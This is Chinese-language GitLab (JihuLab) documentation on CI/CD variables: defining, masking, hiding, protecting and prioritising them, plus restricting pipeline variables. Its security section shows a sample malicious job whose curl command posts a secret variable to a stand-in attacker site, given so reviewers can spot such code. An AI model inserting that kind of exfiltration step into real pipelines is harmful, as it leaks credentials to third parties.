---
stage: Verify
group: Pipeline Authoring
info: To determine the technical writer assigned to the Stage/Group associated with this page, see <https://handbook.gitlab.com/handbook/product/ux/technical-writing/#assignments>
title: CI/CD 变量
description: 配置、使用与安全性。
---

{{< details >}}

- Tier: 基础版，专业版，旗舰版
- Offering: JihuLab.com，私有化部署

{{< /details >}}

CI/CD 变量是一种环境变量。你可以使用它们来：

- 控制作业和流水线的行为。
- 存储想要复用的值，例如在[作业脚本](job_scripts.md)中。
- 避免在 `.gitlab-ci.yml` 文件中硬编码值。

变量名称受 [Runner 使用的 shell](https://gitlab.cn/docs/runner/shells/) 限制，用于执行脚本。每个 shell 都有自己的一组保留变量名称。

为确保行为一致，你应该始终将变量值放在单引号或双引号中。变量由 [Psych YAML 解析器](https://docs.ruby-lang.org/en/master/Psych.html) 内部解析，因此带引号和不带引号的变量可能会被以不同方式解析。例如：

- `VAR1: 012345` 被解释为八进制值，因此其值变为 `5349`。
- `VAR1: "012345"` 被解析为一个值为 `012345` 的字符串。
- `VAR1: 019` 被解析为字符串 `"019"`，而不是八进制，因为 `9` 不是有效的八进制数字。八进制解析仅适用于所有数字都是 0-7 的情况。

如需了解 GitLab CI/CD 的高级用法，请参见由 GitLab 工程师分享的 [7 个 GitLab CI 高级工作流技巧](https://gitlab.cn/webcast/7cicd-hacks/)。

<a id="predefined-cicd-variables"></a>

## 预定义的 CI/CD 变量

极狐GitLab CI/CD 提供了一组[预定义的 CI/CD 变量](predefined_variables.md)，可在流水线配置和作业脚本中使用。这些变量包含有关作业、流水线以及流水线触发或运行时可能需要的其他值的信息。

你可以在不先声明的情况下在 `.gitlab-ci.yml` 中使用预定义的 CI/CD 变量。例如：

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

此示例中的脚本输出 `The job's stage is 'test'`。

<a id="define-a-cicd-variable-in-the-gitlab-ciyml-file"></a>

## 在 `.gitlab-ci.yml` 文件中定义 CI/CD 变量

要在 `.gitlab-ci.yml` 文件中创建 CI/CD 变量，请使用 [`variables`](../yaml/_index.md#variables) 关键字定义变量和值。

保存在 `.gitlab-ci.yml` 文件中的变量对有权访问代码仓库的所有用户可见，并且应仅存储非敏感的项目配置。例如，将数据库 URL 保存在 `DATABASE_URL` 变量中。包含密钥或密钥等值的敏感变量应在 UI 中添加。

你可以在以下位置定义 `variables`：

- 作业中：该变量仅在相应作业的 `script`、`before_script` 或 `after_script` 部分中可用，以及一些[作业关键字](../yaml/_index.md#job-keywords)中可用。
- `.gitlab-ci.yml` 文件的顶层：该变量作为流水线中所有作业的默认变量可用，除非某个作业定义了同名的变量。作业的变量优先。

在两种情况下，你都不可将这些变量用于[全局关键字](../yaml/_index.md#global-keywords)。

例如：

```yaml
variables:
  ALL_JOBS_VAR: "一个默认变量"

job1:
  variables:
    JOB1_VAR: "作业 1 的变量"
  script:
    - echo "变量是 '$ALL_JOBS_VAR' 和 '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "不同于默认的值"
    JOB2_VAR: "作业 2 的变量"
  script:
    - echo "变量是 '$ALL_JOBS_VAR'、'$JOB2_VAR' 和 '$JOB1_VAR'"
```

在此示例中：

- `job1` 输出：`变量是 '一个默认变量' 和 '作业 1 的变量'`
- `job2` 输出：`变量是 '不同于默认的值'、'作业 2 的变量' 和 ''`

使用 `value` 和 `description` 关键字为手动触发的流水线定义[预填充的变量](../pipelines/_index.md#prefill-variables-in-manual-pipelines)。

<a id="skip-default-variables-in-a-single-job"></a>

### 在单个作业中跳过默认变量

如果不希望在作业中使用默认变量，请将 `variables` 设置为 `{}`：

```yaml
variables:
  DEFAULT_VAR: "一个默认变量"

job1:
  variables: {}
  script:
    - echo 此作业不需要任何变量
```

<a id="define-a-cicd-variable-in-the-ui"></a>

## 在 UI 中定义 CI/CD 变量

像令牌或密码这样的敏感变量应存储在 UI 的设置中，而不是 `.gitlab-ci.yml` 文件中。

默认情况下，来自派生项目的流水线无法访问父项目可用的 CI/CD 变量。如果你[从派生项目发起的合并请求中在父项目中运行合并请求流水线](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project)，则所有变量对流水线都可用。

<a id="for-a-project"></a>

### 针对项目

{{< history >}}

- 在极狐GitLab 18.3 中，默认可见性从 **可见** 更改为 **已掩码**。

{{< /history >}}

你可以在项目设置中添加 CI/CD 变量。项目最多可有 8000 个 CI/CD 变量。

先决条件：

- 你必须是指派为维护者角色的项目成员。

在项目设置中添加或更新变量：

1. 在顶部栏中，选择 **搜索或跳转到** 并找到你的项目。
1. 在左侧边栏中，选择 **设置** > **CI/CD**。
1. 展开 **变量**。
1. 选择 **添加变量** 并填写详细信息：
   - **键**：必须为一行，无空格，仅使用字母、数字或 `_`。
   - **值**：值限制为 10,000 个字符，但也受 Runner 操作系统的任何限制约束。如果 **可见性** 设置为 **已掩码** 或 **已掩码并隐藏**，该值还有额外的限制。
   - **类型**：`变量`（默认）或 [`文件`](#use-file-type-cicd-variables)。
   - **环境范围**：可选。**全部（默认）** (`*`)、特定的[环境](../environments/_index.md)或通配符环境范围。
   - **保护变量**：可选。如果选中，该变量仅在运行于受保护分支或受保护标签的流水线中可用。
   - **可见性**：选择 **可见**、**已掩码**（默认）或 **已掩码并隐藏**。
   - **展开变量引用**：可选。如果选中，变量可以引用另一个变量。如果 **可见性** 设置为 **已掩码** 或 **已掩码并隐藏**，则无法引用另一个变量。

或者，可以通过[使用 API](../../api/project_level_variables.md) 添加项目变量。

<a id="for-a-group"></a>

### 针对群组

{{< history >}}

- 在极狐GitLab 18.3 中，默认可见性从 **可见** 更改为 **已掩码**。

{{< /history >}}

你可以让一个群组中的所有项目都能使用 CI/CD 变量。群组最多可有 30,000 个 CI/CD 变量。

先决条件：

- 你必须是指派为所有者角色的群组成员。

添加群组变量：

1. 在顶部栏中，选择 **搜索或跳转到** 并找到你的群组。
1. 在左侧边栏中，选择 **设置** > **CI/CD**。
1. 展开 **变量**。
1. 选择 **添加变量** 并填写详细信息：
   - **键**：必须为一行，无空格，仅使用字母、数字或 `_`。
   - **值**：值限制为 10,000 个字符，但也受 Runner 操作系统的任何限制约束。如果 **可见性** 设置为 **已掩码** 或 **已掩码并隐藏**，该值还有额外的限制。
   - **类型**：`变量`（默认）或 [`文件`](#use-file-type-cicd-variables)。
   - **保护变量**：可选。如果选中，该变量仅在运行于受保护分支或受保护标签的流水线中可用。
   - **可见性**：选择 **可见**、**已掩码**（默认）、**已掩码并隐藏**。
   - **展开变量引用**：可选。如果选中，变量可以引用另一个变量。如果 **可见性** 设置为 **已掩码** 或 **已掩码并隐藏**，则无法引用另一个变量。

项目中可用的群组变量列在项目的 **设置** > **CI/CD** > **变量** 部分。来自子群组的变量会递归继承。

或者，可以通过[使用 API](../../api/group_level_variables.md) 添加群组变量。

<a id="environment-scope"></a>

#### 环境范围

{{< details >}}

- Tier: 专业版，旗舰版

{{< /details >}}

要设置群组 CI/CD 变量仅对特定环境可用：

1. 在顶部栏中，选择 **搜索或跳转到** 并找到你的群组。
1. 在左侧边栏中，选择 **设置** > **CI/CD**。
1. 展开 **变量**。
1. 在变量的右侧，选择 **编辑** ({{< icon name="pencil" >}})。
1. 对于 **环境范围**，选择 **全部（默认）** (`*`)、特定的[环境](../environments/_index.md)或通配符环境范围。

<a id="for-an-instance"></a>

### 针对实例

{{< details >}}

- Tier: 基础版，专业版，旗舰版
- Offering: 私有化部署

{{< /details >}}

{{< history >}}

- 在极狐GitLab 18.3 中，默认可见性从 **可见** 更改为 **已掩码**。

{{< /history >}}

你可以让极狐GitLab 实例中的所有项目和群组都能使用 CI/CD 变量。

先决条件：

- 你必须拥有实例的管理员访问权限。

添加实例变量：

1. 在右上角，选择 **管理员**。
1. 在左侧边栏中，选择 **设置** > **CI/CD**。
1. 展开 **变量**。
1. 选择 **添加变量** 并填写详细信息：
   - **键**：必须为一行，无空格，仅使用字母、数字或 `_`。
   - **值**：值限制为 10,000 个字符，但也受 Runner 操作系统的任何限制约束。如果 **可见性** 设置为 **可见**，则没有其他限制。
   - **类型**：`变量`（默认）或 `文件`。
   - **保护变量**：可选。如果选中，该变量仅在运行于受保护分支或标签的流水线中可用。
   - **可见性**：选择 **可见**、**已掩码**（默认）或 **已掩码并隐藏**。
   - **展开变量引用**：可选。如果选中，变量可以引用另一个变量。如果 **可见性** 设置为 **已掩码** 或 **已掩码并隐藏**，则无法引用另一个变量。

或者，可以通过[使用 API](../../api/instance_level_ci_variables.md) 添加实例变量。

<a id="cicd-variable-security"></a>

## CI/CD 变量安全性

推送到 `.gitlab-ci.yml` 文件的代码可能会危及你的变量。变量可能会意外暴露在作业日志中，或恶意发送到第三方服务器。

在以下操作前，请审查所有对 `.gitlab-ci.yml` 文件引入更改的合并请求：

- [在父项目中为来自派生项目的合并请求运行流水线](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project)。
- 合并更改。

在添加文件或对其运行流水线之前，请审查已导入项目的 `.gitlab-ci.yml` 文件。

以下示例显示了 `.gitlab-ci.yml` 文件中的恶意代码：

```yaml
accidental-leak-job:
  script:                                         # 密码意外暴露
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # 密钥被恶意暴露
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

为了降低像 `accidental-leak-job` 这样的脚本意外泄露密钥的风险，所有包含敏感信息的变量在作业日志中应始终被掩码。你还可以[将变量限定为仅受保护分支和标签](#protect-a-cicd-variable)。

或者，[连接外部密钥管理提供程序](../secrets/_index.md) 来存储和检索密钥。

像 `malicious-job` 这样的恶意脚本必须在审查过程中被捕获。审查者在发现此类代码后绝不应触发流水线，因为恶意代码可以危及被掩码和受保护的变量。

变量值使用 [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) 加密并存储在数据库中。这些数据可以通过有效的[密钥文件](../../administration/backup_restore/troubleshooting_backup_gitlab.md#when-the-secrets-file-is-lost) 读取和解密。

<a id="mask-a-cicd-variable"></a>

### 屏蔽 CI/CD 变量

> [!warning]
> 屏蔽 CI/CD 变量并不是防止恶意用户访问变量值的保证方式。为确保敏感信息的安全，考虑使用[外部密钥](../secrets/_index.md) 和[文件类型变量](#use-file-type-cicd-variables)，以防止像 `env` 或 `printenv` 这样的命令打印出密钥变量。

你可以为项目、群组或实例屏蔽 CI/CD 变量，以防止其值出现在作业日志中。当作业输出被屏蔽变量的值时，该值会在作业日志中被替换为 `[MASKED]`。在某些情况下，`[MASKED]` 值后面还可能跟着 `x` 字符。

先决条件：

- 你必须拥有与[在 UI 中添加 CI/CD 变量](#define-a-cicd-variable-in-the-ui) 所需的相同角色或访问级别。

要屏蔽变量：

1. 对于群组、项目或在 **管理员** 区域，选择 **设置** > **CI/CD**。
1. 展开 **变量**。
1. 在你想要保护的变量旁边，选择 **编辑**。
1. 在 **可见性** 下，选择 **屏蔽变量**。
1. 推荐操作。清除 **展开变量引用** 复选框。如果启用了变量展开，你只能在变量值中使用以下非字母数字字符：`_`、`:`、`@`、`-`、`+`、`.`、`~`、`=`、`/` 和 `~`。禁用此设置后，所有字符均可使用。
1. 选择 **更新变量**。

变量值必须：

- 为一行，无空格。
- 长度为 8 个或更多字符。
- 不与现有的预定义或自定义 CI/CD 变量名称匹配。

如果某个进程以轻微修改的方式输出该值，则该值无法被屏蔽。例如，如果 shell 添加 ` \ ` 来转义特殊字符，则该值不会被屏蔽：

- 示例被屏蔽的变量值：`My[value]`
- 此输出不会被屏蔽：`My\[value\]`

当启用了 `CI_DEBUG_SERVICES` 时，变量值可能会被揭示。有关更多信息，请参见[服务容器日志记录](../services/_index.md#capturing-service-container-logs)。

<a id="hide-a-cicd-variable"></a>

### 隐藏 CI/CD 变量

{{< history >}}

- 于极狐GitLab 17.4 引入，带有一个名为 `ci_hidden_variables` 的功能标志。默认启用。
- 于极狐GitLab 17.6 正式发布。功能标志 `ci_hidden_variables` 已移除。

{{< /history >}}

除了屏蔽，你还可以阻止 CI/CD 变量的值在 **CI/CD** 设置页面中显示。隐藏变量只能在创建新变量时进行，你不能将现有变量更新为隐藏状态。

先决条件：

- 你必须拥有与[在 UI 中添加 CI/CD 变量](#define-a-cicd-variable-in-the-ui) 所需的相同角色或访问级别。
- 变量值必须符合[屏蔽变量的要求](#mask-a-cicd-variable)。

要隐藏变量，在[在 UI 中添加新 CI/CD 变量](#define-a-cicd-variable-in-the-ui) 时，在 **可见性** 部分选择 **已掩码并隐藏**。保存变量后，该变量可在 CI/CD 流水线中使用，但不能在 UI 中再次显示。

<a id="protect-a-cicd-variable"></a>

### 保护 CI/CD 变量

你可以将项目、群组或实例的 CI/CD 变量配置为仅对运行在[受保护分支](../../user/project/repository/branches/protected.md) 或[受保护标签](../../user/project/protected_tags.md) 上的流水线可用。

合并结果流水线和合并请求流水线可以[选择性地访问受保护变量](../pipelines/merge_request_pipelines.md#control-access-to-protected-variables-and-runners)。

先决条件：

- 你必须拥有与[在 UI 中添加 CI/CD 变量](#define-a-cicd-variable-in-the-ui) 所需的相同角色或访问级别。

要将变量设置为受保护：

1. 对于项目或群组，转到 **设置** > **CI/CD**。
1. 展开 **变量**。
1. 在你想要保护的变量旁边，选择 **编辑**。
1. 选中 **保护变量** 复选框。
1. 选择 **更新变量**。

该变量将可用于所有后续流水线。

<a id="use-file-type-cicd-variables"></a>

### 使用文件类型 CI/CD 变量

所有预定义的 CI/CD 变量和在 `.gitlab-ci.yml` 文件中定义的变量都是“变量”类型（在 API 中为 `"variable_type": "env_var"`）。

变量类型的变量：

- 由键值对组成。
- 在作业中作为环境变量提供，其中：
  - CI/CD 变量的键是环境变量名称。
  - CI/CD 变量的值是环境变量的值。

项目、群组和实例的 CI/CD 变量默认是“变量”类型，但也可以选择设置为“文件”类型（在 API 中为 `"variable_type": "file"`）。文件类型的变量：

- 由键、值和文件组成。
- 在作业中作为环境变量提供，其中：
  - CI/CD 变量的键是环境变量名称。
  - CI/CD 变量的值保存到一个临时文件。
  - 临时文件的路径作为环境变量的值。

对于需要文件作为输入的工具，请使用文件类型的 CI/CD 变量。

例如，AWS CLI 和 `kubectl` 都是使用 `File` 类型变量进行配置的工具。如果你使用 `kubectl` 并搭配：

- 一个键为 `KUBE_URL`、值为 `https://example.com` 的变量。
- 一个键为 `KUBE_CA_PEM`、值为证书的文件类型变量。

将 `KUBE_URL` 作为 `--server` 选项传递，该选项接受一个变量，并将 `$KUBE_CA_PEM` 作为 `--certificate-authority` 选项传递，该选项接受文件路径：

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

<a id="use-a-gitlab-ciyml-variable-as-a-file-type-variable"></a>

#### 将 `.gitlab-ci.yml` 变量用作文件类型变量

你不能将[在 `.gitlab-ci.yml` 文件中定义的 CI/CD 变量](#define-a-cicd-variable-in-the-gitlab-ciyml-file) 设置为文件类型变量。如果你使用的工具需要文件路径作为输入，但你想使用在 `.gitlab-ci.yml` 中定义的变量：

- 运行一个命令，将变量的值保存到文件中。
- 在你的工具中使用该文件。

例如：

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

<a id="allow-cicd-variable-expansion"></a>

## 允许 CI/CD 变量展开

{{< history >}}

- **展开变量** 选项在极狐GitLab 16.3 中重命名为 **展开变量引用**。
- 在极狐GitLab 18.6 中更改，默认情况下禁用。

{{< /history >}}

你可以设置一个变量，以便将带有 `$` 字符的值视为对另一个变量的引用。当流水线运行时，该引用会展开以使用被引用变量的值。

默认情况下，在 UI 中定义的 CI/CD 变量不会被展开。对于在 `.gitlab-ci.yml` 文件中定义的 CI/CD 变量，通过 [`variables:expand` 关键字](../yaml/_index.md#variablesexpand) 控制变量展开。

先决条件：

- 你必须拥有与[在 UI 中添加 CI/CD 变量](#define-a-cicd-variable-in-the-ui) 所需的相同角色或访问级别。

要为变量启用变量展开：

1. 对于项目或群组，转到 **设置** > **CI/CD**。
1. 展开 **变量**。
1. 在你不想展开的变量旁边，选择 **编辑**。
1. 选中 **展开变量引用** 复选框。
1. 选择 **更新变量**。

> [!note]
> 如果你想使用变量展开，请不要[屏蔽](#mask-a-cicd-variable) 变量值。如果同时组合了屏蔽和变量展开，字符限制会阻止使用 `$` 来引用其他变量。

<a id="cicd-variable-precedence"></a>

## CI/CD 变量优先级

{{< history >}}

- 在极狐GitLab 16.7 中，扫描执行策略变量的优先级发生了更改，带有一个名为 `security_policies_variables_precedence` 的功能标志。默认启用。功能标志在极狐GitLab 16.8 中移除。

{{< /history >}}

你可以在不同的位置使用相同名称的 CI/CD 变量，但这些值可能会相互覆盖。变量类型及其定义位置决定了哪些变量优先。

变量的优先级顺序为（从高到低）：

1. [流水线执行策略变量](../../user/application_security/policies/pipeline_execution_policies.md#cicd-variables)。
1. [扫描执行策略变量](../../user/application_security/policies/scan_execution_policies.md)。
1. [流水线变量](#use-pipeline-variables)。这些变量的优先级均相同：
   - 传递给下游流水线的变量。
   - 触发器变量。
   - 调度流水线变量。
   - 手动流水线变量。
   - 通过 API 创建流水线时添加的变量。
   - 手动作业变量。
1. 项目变量。
1. 群组变量。如果同一个变量名称出现在一个群组及其子群组中，作业将使用来自最近子群组的值。例如，如果你有 `群组 > 子群组 1 > 子群组 2 > 项目`，则在 `子群组 2` 中定义的变量优先。
1. 实例变量。
1. [来自 `dotenv` 报告的变量](dotenv_variables.md#pass-variables-to-later-jobs)。
1. 在 `.gitlab-ci.yml` 文件的作业中定义的作业变量。
1. 在 `.gitlab-ci.yml` 文件顶层定义的所有作业的默认变量。
1. [部署变量](predefined_variables.md#deployment-variables)。
1. [预定义变量](predefined_variables.md)。

例如：

```yaml
variables:
  API_TOKEN: "default"

job1:
  variables:
    API_TOKEN: "secure"
  script:
    - echo "The variable is '$API_TOKEN'"
```

在此示例中，`job1` 输出 `The variable is 'secure'`，因为在 `.gitlab-ci.yml` 文件的作业中定义的变量的优先级高于默认变量。

<a id="use-pipeline-variables"></a>

## 使用流水线变量

流水线变量是在运行新流水线时指定的变量。

> [!note]
> 在 [极狐GitLab 17.7](../../update/deprecations.md#increased-default-security-for-use-of-pipeline-variables) 及更高版本中，推荐使用[流水线输入](../inputs/_index.md#for-a-pipeline) 而不是传递流水线变量。为了提高安全性，在使用输入时你应该[禁用流水线变量](#restrict-pipeline-variables)。

先决条件：

- 你必须在项目中具有开发者角色。

你可以在以下情况下指定流水线变量：

- 在 UI 中[手动运行流水线](../jobs/job_control.md#specify-variables-when-running-manual-jobs)。
- 创建[调度的流水线](../pipelines/schedules.md#create-a-pipeline-schedule)。
- 通过使用 [`pipelines` API 端点](../../api/pipelines.md#create-a-new-pipeline) 创建流水线。
- 通过使用 [`triggers` API 端点](../triggers/_index.md#pass-cicd-variables-in-the-api-call) 创建流水线。
- 使用[推送选项](../../topics/git/commit.md#push-options-for-gitlab-cicd)。
- 通过使用 [`variables` 关键字](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline)、[`trigger:forward` 关键字](../yaml/_index.md#triggerforward) 或 [`dotenv` 变量](../pipelines/downstream_pipelines.md#pass-dotenv-variables-created-in-a-job) 将变量传递给下游流水线。

这些变量的优先级更高，并且可以覆盖其他已定义的变量，包括预定义变量。

> [!warning]
> 在大多数情况下，你应该避免覆盖预定义变量，因为这可能会导致流水线行为异常。

<a id="restrict-pipeline-variables"></a>

### 限制流水线变量

{{< history >}}

- 于极狐GitLab 17.1 引入。
- 对于 JihuLab.com，在极狐GitLab 17.7 中，所有新命名空间中的新项目的 `ci_pipeline_variables_minimum_override_role` 默认值已更新为 `no_one_allowed`。

{{< /history >}}

你可以限制哪些用户角色可以使用流水线变量运行流水线。当较低角色的用户尝试使用流水线变量时，他们会收到 `权限不足，无法设置流水线变量` 的错误消息。

先决条件：

- 你必须在项目中具有维护者角色。如果之前将最低角色设置为 `owner` 或 `no_one_allowed`，那么你必须在项目中具有所有者角色。

要限制流水线变量的使用仅限维护者角色及以上：

- 进入 **设置** > **CI/CD** > **变量**。
- 在 **使用流水线变量的最低角色** 下，选择以下之一：
  - `no_one_allowed`：不允许任何流水线使用流水线变量运行。在 JihuLab.com 上新命名空间中的新项目的默认值。
  - `owner`：仅具有所有者角色的用户可以使用流水线变量运行流水线。你必须具有项目的所有者角色才能将设置更改为此值。
  - `maintainer`：仅具有维护者或所有者角色的用户可以使用流水线变量运行流水线。在私有化部署上未指定时的默认值。
  - `developer`：仅具有开发者、维护者或所有者角色的用户可以使用流水线变量运行流水线。

你还可以使用 [项目 API](../../api/projects.md#update-a-project) 为 `ci_pipeline_variables_minimum_override_role` 设置角色。

此限制不影响项目或群组设置中的 CI/CD 变量的使用。大多数作业仍然可以在 YAML 配置中使用 `variables` 关键字，但不能在使用 `trigger` 关键字触发下游流水线的作业中使用。触发作业将变量作为流水线变量传递给下游流水线，这也受此设置控制。

<a id="enable-pipeline-variable-restriction-for-multiple-projects"></a>

#### 为多个项目启用流水线变量限制

{{< history >}}

- 在极狐GitLab 18.4 中引入。

{{< /history >}}

对于包含许多项目的群组，你可以禁用当前未使用流水线变量的所有项目中的流水线变量。此选项会将从未使用过流水线变量的项目的 **使用流水线变量的最低角色** 设置设为 `no_one_allowed`。

先决条件：

- 你必须具有群组的所有者角色。

要在群组中的项目中启用流水线变量限制设置：

1. 在顶部栏中，选择 **搜索或跳转到** 并找到你的群组。
1. 在左侧边栏中，选择 **设置** > **CI/CD**。
1. 展开 **变量**。
1. 在 **禁用未使用流水线变量的项目中的流水线变量** 部分，选择 **开始迁移**。

迁移在后台运行。迁移完成后，你会收到电子邮件通知。如果需要，项目维护者可以稍后更改其各自项目的设置。

<a id="exporting-variables"></a>

## 导出变量

在单独的 shell 上下文中执行的脚本不会共享导出、别名、本地函数定义或任何其他本地 shell 更新。

这意味着如果作业失败，用户定义脚本创建的变量不会被导出。

当 Runner 执行 `.gitlab-ci.yml` 中定义的作业时：

- `before_script` 中指定的脚本和主脚本在单个 shell 上下文中一起执行，并被连接起来。
- `after_script` 中指定的脚本在与 `before_script` 和指定的脚本完全分离的 shell 上下文中运行。

无论脚本在哪个 shell 中执行，Runner 输出都包括：

- 预定义变量。
- 在以下位置定义的变量：
  - 实例、群组或项目 CI/CD 设置。
  - `.gitlab-ci.yml` 文件中的 `variables:` 部分。
  - `.gitlab-ci.yml` 文件中的 `secrets:` 部分。
  - `config.toml`。

Runner 无法处理在脚本主体中执行的手动导出、shell 别名和函数，例如 `export MY_VARIABLE=1`。

例如，在以下 `.gitlab-ci.yml` 文件中，定义了以下脚本：

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

当 Runner 执行作业时：

1. 执行 `before_script`：
   1. 输出到日志。
   1. 定义 `MY_VARIABLE` 变量。
1. 执行 `script`：
   1. 输出到日志。
   1. 输出 `JOB_DEFINED_VARIABLE` 的值。
   1. 输出 `CI_COMMIT_SHA` 的值。
   1. 输出 `MY_VARIABLE` 的值。
1. 在新的、单独的 shell 上下文中执行 `after_script`：
   1. 输出到日志。
   1. 输出 `JOB_DEFINED_VARIABLE` 的值。
   1. 输出 `CI_COMMIT_SHA` 的值。
   1. 输出 `MY_VARIABLE` 的空值。无法检测到变量值，因为 `after_script` 与 `before_script` 在不同的 shell 上下文中。